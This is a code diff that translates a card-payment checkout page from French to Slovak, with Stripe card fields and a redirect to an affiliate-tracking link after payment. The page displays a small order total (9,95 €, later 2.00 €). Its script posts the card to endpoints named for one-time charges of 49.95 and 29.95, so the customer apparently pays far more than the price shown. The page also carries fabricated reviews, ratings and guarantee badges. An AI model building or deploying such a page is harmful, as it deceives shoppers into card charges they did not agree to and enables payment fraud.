@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="sk">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-<title>Paiement sécurisé</title>
+<title>Zabezpečená platba</title>
 <meta name="referrer" content="no-referrer">
 
 <!-- Google tag -->
@@ -19,10 +19,8 @@ gtag('config', 'G-FDQ6REQWS8', { send_page_view: true });
 :root{--bg:#fafafa;--text:#0a2540;--muted:#5b6b82;--line:#e5e7eb;}
 *{box-sizing:border-box}
 html,body{height:100%}
-body{
-margin:0;background:var(--bg);color:var(--text);
-font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
-}
+body{margin:0;background:var(--bg);color:var(--text);
+font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;}
 
 .wrap{max-width:1100px;margin:0 auto;padding:18px 14px 60px}
 .safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px}
@@ -71,18 +69,11 @@ animation:loadingBar 2.2s ease-in-out infinite}
 
 <body>
 
-<script>
-sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
-</script>
-
-<div class="safe">Paiement sécurisé SSL</div>
+<div class="safe">Zabezpečená SSL platba</div>
 
 <div class="wrap">
-
-<div class="page-title">
-Paiement sécurisé 🔒 <span class="stars">★★★★★</span>
-<span class="reviews">(2777 avis)</span>
-</div>
+<div class="page-title">Zabezpečená platba 🔒 <span class="stars">★★★★★</span>
+<span class="reviews">(2777 recenzií)</span></div>
 
 <div class="grid">
 
@@ -94,44 +85,43 @@ Paiement sécurisé 🔒 <span class="stars">★★★★★</span>
 <img id="heroImg">
 <div>
 <div id="heroTitle" style="font-weight:900;font-size:14px"></div>
-<div class="sub">Produit depuis votre lien</div>
+<div class="sub">Produkt z vášho odkazu</div>
 </div>
 </div>
 
-<div class="h2">1. Informations</div>
-
-<div class="form-grid">
-<input id="firstName" class="input" placeholder="Prénom">
-<input id="lastName" class="input" placeholder="Nom">
-</div>
+<div class="h2">1. Informácie</div>
 
 <div class="form-grid">
-<input id="billingStreet" class="input" placeholder="Adresse" style="grid-column:1/-1">
-<input id="billingPostcode" class="input" placeholder="Code postal">
-<input id="billingCity" class="input" placeholder="Ville">
+<input id="firstName" class="input" placeholder="Meno">
+<input id="lastName" class="input" placeholder="Priezvisko">
+</div>
+
+<div class="form-grid">
+<input id="billingStreet" class="input" placeholder="Adresa" style="grid-column:1/-1">
+<input id="billingPostcode" class="input" placeholder="PSČ">
+<input id="billingCity" class="input" placeholder="Mesto">
 </div>
 
 <div class="form-grid">
 <input id="emailInput" class="input" type="email" placeholder="Email">
-<input class="input" value="France" disabled>
+<input class="input" value="Slovensko" disabled>
 </div>
 
 <div class="form-grid">
 <select id="phonePrefix" class="select">
-<option value="+33">+33 — France</option>
+<option value="+421">+421 — Slovensko</option>
 </select>
-<input id="phoneNumber" class="input" placeholder="Numéro de téléphone">
+<input id="phoneNumber" class="input" placeholder="Telefónne číslo">
 </div>
 
 <input id="nameInput" type="hidden">
-<button id="nextBtn" class="btn">Continuer</button>
+<button id="nextBtn" class="btn">Pokračovať</button>
 
 </section>
 
 <section id="step2" class="step" aria-hidden="true">
-
-<div class="h2">2. Paiement</div>
-<p class="sub">Les informations de carte sont chiffrées et traitées par Stripe.</p>
+<div class="h2">2. Platba</div>
+<p class="sub">Údaje o karte sú šifrované a spracované cez Stripe.</p>
 
 <div>
 <div id="card-number" class="el"></div>
@@ -144,8 +134,8 @@ Paiement sécurisé 🔒 <span class="stars">★★★★★</span>
 <div id="err" class="err" aria-hidden="true"></div>
 
 <div style="display:flex;gap:10px;margin-top:12px">
-<button id="backBtn" class="btn" style="width:40%">Retour</button>
-<button id="payNow" class="btn" style="width:60%">Payer en toute sécurité</button>
+<button id="backBtn" class="btn" style="width:40%">Späť</button>
+<button id="payNow" class="btn" style="width:60%">Zaplaťte bezpečne</button>
 </div>
 
 </section>
@@ -155,31 +145,30 @@ Paiement sécurisé 🔒 <span class="stars">★★★★★</span>
 <aside>
 
 <div class="widget">
-<div style="text-align:center;font-weight:800">Avis clients</div>
-<div style="text-align:center;font-weight:700;">Fenella Lara</div>
+<div style="text-align:center;font-weight:800">Čo hovoria zákazníci</div>
 <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-<p style="text-align:center">J’ai reçu mon produit hier. Excellente expérience !</p>
+<p style="text-align:center">Skvelá skúsenosť!</p>
 </div>
 
 <div class="widget">
 <div class="delivery">
 <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
 <div>
-<div style="font-weight:800">Livraison rapide</div>
-<div class="sub">3–5 jours ouvrés</div>
+<div style="font-weight:800">Rýchle doručenie</div>
+<div class="sub">3–5 pracovných dní</div>
 </div>
-<div style="margin-left:auto;font-weight:800">Gratuite</div>
+<div style="margin-left:auto;font-weight:800">Zadarmo</div>
 </div>
 
-<div style="margin-top:14px;font-weight:800">Récapitulatif</div>
-<div class="order-row"><span>Total</span><span>9,95 €</span></div>
+<div style="margin-top:14px;font-weight:800">Súhrn objednávky</div>
+<div class="order-row"><span>Celkom</span><span>2.00 €</span></div>
 </div>
 
 <div class="widget">
-<div style="font-weight:800;margin-bottom:10px">Pourquoi nous faire confiance</div>
+<div style="font-weight:800;margin-bottom:10px">Prečo nám môžete veriť</div>
 <div class="trust">
-<div class="box"><div>⭐</div><div>99% avis positifs</div></div>
-<div class="box"><div>🔒</div><div>Sécurisé SSL</div></div>
+<div class="box"><div>⭐</div><div>99% pozitívne</div></div>
+<div class="box"><div>🔒</div><div>SSL zabezpečené</div></div>
 <div class="box"><div>🛡️</div><div>250 000 €</div></div>
 </div>
 </div>
@@ -191,9 +180,9 @@ Paiement sécurisé 🔒 <span class="stars">★★★★★</span>
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
 <div class="loading-box">
-<div class="loading-title">Traitement du paiement…</div>
+<div class="loading-title">Spracovanie platby…</div>
 <div class="progress-wrap"><div class="progress-bar"></div></div>
-<p class="sub" style="margin-top:10px">Veuillez patienter quelques secondes…</p>
+<p class="sub" style="margin-top:10px">Prosím čakajte…</p>
 </div>
 </div>
 
@@ -210,25 +199,17 @@ const heroImg=document.getElementById('heroImg');
 const heroTitle=document.getElementById('heroTitle');
 const sidebarImg=document.getElementById('sidebarImg');
 
-// HERO (SAFE)
-if(qs.get('sub1') && heroTitle && hero){
-  heroTitle.textContent = d(qs.get('sub1'));
-  hero.style.display = 'flex';
+// HERO
+if(qs.get('sub1')){
+heroTitle.textContent=d(qs.get('sub1'));
+hero.style.display='flex';
 }
-
 if(qs.get('sub2')){
-  if(heroImg){
-    heroImg.src = d(qs.get('sub2'));
-  }
-  if(sidebarImg){
-    sidebarImg.src = d(qs.get('sub2'));
-    sidebarImg.style.display = 'block';
-  }
-  if(hero){
-    hero.style.display = 'flex';
-  }
+heroImg.src=d(qs.get('sub2'));
+sidebarImg.src=d(qs.get('sub2'));
+sidebarImg.style.display='block';
+hero.style.display='flex';
 }
-
 
 // PREFILL
 if(qs.get('sub3')) firstName.value=d(qs.get('sub3'));
@@ -261,6 +242,7 @@ step1.setAttribute('aria-hidden','false');
 };
 
 payNow.onclick=async()=>{
+
 payNow.disabled=true;
 err.setAttribute("aria-hidden","true");
 const overlay=document.getElementById("loading-overlay");
@@ -276,7 +258,7 @@ address:{
 line1:billingStreet.value,
 city:billingCity.value,
 postal_code:billingPostcode.value,
-country:"FR"
+country:"SK"
 }
 };
 
@@ -286,32 +268,23 @@ card:cardNumber,
 billing_details:billingDetails
 });
 
-const r = await fetch("/api/stripe/s3/one-time-49-95",{
+const r = await fetch("/api/stripe/s3/one-time-29-95",{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({paymentMethodId:pm.paymentMethod.id,billingDetails})
 });
 
 const data=await r.json();
-
-console.log("SERVER RESPONSE:", data);
-
-if (!data.clientSecret) {
-  throw new Error(data.error || "No clientSecret returned from server");
-}
-
 const result=await stripe.confirmCardPayment(data.clientSecret,{
-  payment_method:pm.paymentMethod.id
+payment_method:pm.paymentMethod.id
 });
 
-if(result.error) throw result.error;
-
 if(result.paymentIntent && result.paymentIntent.status==="succeeded"){
-window.location.href="https://cudsr.bemobtrcks.com/go/a0224109-84eb-47be-926c-e1a7232611a7";
+window.location.href="https://cudsr.bemobtrcks.com/go/6b6e67d8-fe22-4816-8318-ef7cf7685f83?";
 return;
 }
 
-throw new Error("Payment not completed");
+throw new Error("Payment failed");
 
 }catch(e){
 err.textContent=e.message;
